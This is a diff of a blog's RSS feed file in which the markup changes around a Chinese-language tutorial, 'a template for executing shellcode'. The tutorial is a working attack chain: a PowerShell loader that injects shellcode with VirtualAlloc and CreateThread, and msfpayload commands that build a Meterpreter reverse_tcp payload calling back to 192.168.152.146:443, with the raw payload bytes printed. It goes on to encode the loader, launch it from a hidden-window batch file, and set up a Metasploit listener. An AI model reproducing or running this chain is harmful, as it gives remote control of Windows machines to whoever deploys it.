@@ -19,78 +19,78 @@
       <description>執行shellcode的模板
 $code = &amp;#39;[DllImport(&amp;#34;kernel32.dll&amp;#34;)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(&amp;#34;kernel32.dll&amp;#34;)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(&amp;#34;msvcrt.dll&amp;#34;)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);&amp;#39;;$winFunc = Add-Type -memberDefinition $code -Name &amp;#34;Win32&amp;#34; -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = SHELLCOD;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 }; SHELLCOD的地方是要替換的</description>
       <content:encoded><![CDATA[<p>執行shellcode的模板</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$code = &#39;[DllImport(&#34;kernel32.dll&#34;)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(&#34;kernel32.dll&#34;)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(&#34;msvcrt.dll&#34;)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);&#39;;$winFunc = Add-Type -memberDefinition $code -Name &#34;Win32&#34; -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = SHELLCOD;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
-</code></pre></div><p><code>SHELLCOD</code>的地方是要替換的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$code = &#39;[DllImport(&#34;kernel32.dll&#34;)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(&#34;kernel32.dll&#34;)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(&#34;msvcrt.dll&#34;)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);&#39;;$winFunc = Add-Type -memberDefinition $code -Name &#34;Win32&#34; -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = SHELLCOD;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
+</span></span></code></pre></div><p><code>SHELLCOD</code>的地方是要替換的</p>
 <p>我們用msf生成我們的shellcode</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">msfpayload windows/x64/meterpreter/reverse_tcp LHOST=192.168.152.146 LPORT=443 C | more
-</code></pre></div><p>查看一下</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">/*
- * windows/x64/meterpreter/reverse_tcp - 422 bytes (stage 1)
- * http://www.metasploit.com
- * VERBOSE=false, LHOST=192.168.152.146, LPORT=443,
- * ReverseConnectRetries=5, ReverseAllowProxy=false,
- * EXITFUNC=process, AutoLoadStdapi=true,
- * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true,
- * EnableUnicodeEncoding=true
- */
-unsigned char buf[] =
-&#34;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&#34;
-&#34;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&#34;
-&#34;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&#34;
-&#34;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&#34;
-&#34;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&#34;
-&#34;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&#34;
-&#34;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&#34;
-&#34;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&#34;
-&#34;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&#34;
-&#34;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&#34;
-&#34;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&#34;
-&#34;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&#34;
-&#34;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&#34;
-&#34;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33&#34;
-&#34;\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00&#34;
-&#34;\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x98\x92\x41\x54&#34;
-&#34;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c&#34;
-&#34;\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff&#34;
-&#34;\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2&#34;
-&#34;\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48&#34;
-&#34;\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99&#34;
-&#34;\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec&#34;
-&#34;\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41&#34;
-&#34;\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41&#34;
-&#34;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&#34;
-&#34;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&#34;
-&#34;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&#34;
-&#34;\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41&#34;
-&#34;\xff\xe7&#34;;
-/*
- * windows/x64/meterpreter/reverse_tcp - 951296 bytes (stage 2)
- * http://www.metasploit.com
- */
-unsigned char buf[] =
-&#34;\x4d\x5a\x41\x52\x55\x48\x89\xe5\x48\x81\xec\x20\x00\x00\x00&#34;
-&#34;\x48\x8d\x1d\xea\xff\xff\xff\x48\x81\xc3\xf0\x1b\x00\x00\xff&#34;
-&#34;\xd3\x48\x89\xc3\x49\x89\xf8\x68\x04\x00\x00\x00\x5a\xff\xd0&#34;
-&#34;\x41\xb8\xf0\xb5\xa2\x56\x68\x05\x00\x00\x00\x5a\xff\xd3\x00&#34;
-</code></pre></div><p>必需處理一下變成我們需要的格式</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">msfpayload windows/x64/meterpreter/reverse_tcp LHOST=192.168.152.146 LPORT=443 C | sed -n -e &#39;1,40p&#39; | sed &#39;s/[&#34;;]//g&#39; | sed &#39;s/\\/,0/g&#39; | tr -d &#39;\n&#39; 
-</code></pre></div><p>使用sed來處理，紅色40是行數，假如shellcode較長看有幾行自行調整
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>msfpayload windows/x64/meterpreter/reverse_tcp LHOST=192.168.152.146 LPORT=443 C | more
+</span></span></code></pre></div><p>查看一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/*
+</span></span><span style="display:flex;"><span> * windows/x64/meterpreter/reverse_tcp - 422 bytes (stage 1)
+</span></span><span style="display:flex;"><span> * http://www.metasploit.com
+</span></span><span style="display:flex;"><span> * VERBOSE=false, LHOST=192.168.152.146, LPORT=443,
+</span></span><span style="display:flex;"><span> * ReverseConnectRetries=5, ReverseAllowProxy=false,
+</span></span><span style="display:flex;"><span> * EXITFUNC=process, AutoLoadStdapi=true,
+</span></span><span style="display:flex;"><span> * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true,
+</span></span><span style="display:flex;"><span> * EnableUnicodeEncoding=true
+</span></span><span style="display:flex;"><span> */
+</span></span><span style="display:flex;"><span>unsigned char buf[] =
+</span></span><span style="display:flex;"><span>&#34;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&#34;
+</span></span><span style="display:flex;"><span>&#34;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&#34;
+</span></span><span style="display:flex;"><span>&#34;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&#34;
+</span></span><span style="display:flex;"><span>&#34;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&#34;
+</span></span><span style="display:flex;"><span>&#34;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&#34;
+</span></span><span style="display:flex;"><span>&#34;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&#34;
+</span></span><span style="display:flex;"><span>&#34;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&#34;
+</span></span><span style="display:flex;"><span>&#34;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&#34;
+</span></span><span style="display:flex;"><span>&#34;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&#34;
+</span></span><span style="display:flex;"><span>&#34;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&#34;
+</span></span><span style="display:flex;"><span>&#34;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&#34;
+</span></span><span style="display:flex;"><span>&#34;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&#34;
+</span></span><span style="display:flex;"><span>&#34;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&#34;
+</span></span><span style="display:flex;"><span>&#34;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33&#34;
+</span></span><span style="display:flex;"><span>&#34;\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00&#34;
+</span></span><span style="display:flex;"><span>&#34;\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x98\x92\x41\x54&#34;
+</span></span><span style="display:flex;"><span>&#34;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c&#34;
+</span></span><span style="display:flex;"><span>&#34;\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff&#34;
+</span></span><span style="display:flex;"><span>&#34;\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2&#34;
+</span></span><span style="display:flex;"><span>&#34;\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48&#34;
+</span></span><span style="display:flex;"><span>&#34;\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99&#34;
+</span></span><span style="display:flex;"><span>&#34;\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec&#34;
+</span></span><span style="display:flex;"><span>&#34;\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41&#34;
+</span></span><span style="display:flex;"><span>&#34;\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41&#34;
+</span></span><span style="display:flex;"><span>&#34;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&#34;
+</span></span><span style="display:flex;"><span>&#34;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&#34;
+</span></span><span style="display:flex;"><span>&#34;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&#34;
+</span></span><span style="display:flex;"><span>&#34;\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41&#34;
+</span></span><span style="display:flex;"><span>&#34;\xff\xe7&#34;;
+</span></span><span style="display:flex;"><span>/*
+</span></span><span style="display:flex;"><span> * windows/x64/meterpreter/reverse_tcp - 951296 bytes (stage 2)
+</span></span><span style="display:flex;"><span> * http://www.metasploit.com
+</span></span><span style="display:flex;"><span> */
+</span></span><span style="display:flex;"><span>unsigned char buf[] =
+</span></span><span style="display:flex;"><span>&#34;\x4d\x5a\x41\x52\x55\x48\x89\xe5\x48\x81\xec\x20\x00\x00\x00&#34;
+</span></span><span style="display:flex;"><span>&#34;\x48\x8d\x1d\xea\xff\xff\xff\x48\x81\xc3\xf0\x1b\x00\x00\xff&#34;
+</span></span><span style="display:flex;"><span>&#34;\xd3\x48\x89\xc3\x49\x89\xf8\x68\x04\x00\x00\x00\x5a\xff\xd0&#34;
+</span></span><span style="display:flex;"><span>&#34;\x41\xb8\xf0\xb5\xa2\x56\x68\x05\x00\x00\x00\x5a\xff\xd3\x00&#34;
+</span></span></code></pre></div><p>必需處理一下變成我們需要的格式</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>msfpayload windows/x64/meterpreter/reverse_tcp LHOST=192.168.152.146 LPORT=443 C | sed -n -e &#39;1,40p&#39; | sed &#39;s/[&#34;;]//g&#39; | sed &#39;s/\\/,0/g&#39; | tr -d &#39;\n&#39; 
+</span></span></code></pre></div><p>使用sed來處理，紅色40是行數，假如shellcode較長看有幾行自行調整
 處理以後的格式</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,0xc0,0xa8,0x98,0x92,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x48,0x83,0xc4,0x20,0x5e,0x6a,0x40,0x41,0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xe1,0x41,0xff,0xe7
-</code></pre></div><p>貼上我們的模板
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,0xc0,0xa8,0x98,0x92,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x48,0x83,0xc4,0x20,0x5e,0x6a,0x40,0x41,0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xe1,0x41,0xff,0xe7
+</span></span></code></pre></div><p>貼上我們的模板
 在使用加密腳本加密一下</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">./ps_encoder.py -s 111
-</code></pre></div><p>下載地址 <a href="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py">https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>./ps_encoder.py -s 111
+</span></span></code></pre></div><p>下載地址 <a href="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py">https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py</a></p>
 <p>加密以後
 建立一個bat檔
 powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand &lt;加密後的字串&gt;</p>
 <p>使用MSF監聽</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">use multi/handler
-set payload windows/x64/meterpreter/reverse_tcp
-set lport 443
-set LHOST 0.0.0.0
-exploit
-</code></pre></div><p>之後執行bat檔就可以看到MSF有反應了
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>use multi/handler
+</span></span><span style="display:flex;"><span>set payload windows/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>set lport 443
+</span></span><span style="display:flex;"><span>set LHOST 0.0.0.0
+</span></span><span style="display:flex;"><span>exploit
+</span></span></code></pre></div><p>之後執行bat檔就可以看到MSF有反應了
 youtube: <a href="http://www.youtube.com/watch?v=oLKTo8dew_o">http://www.youtube.com/watch?v=oLKTo8dew_o</a></p>
 ]]></content:encoded>
     </item>
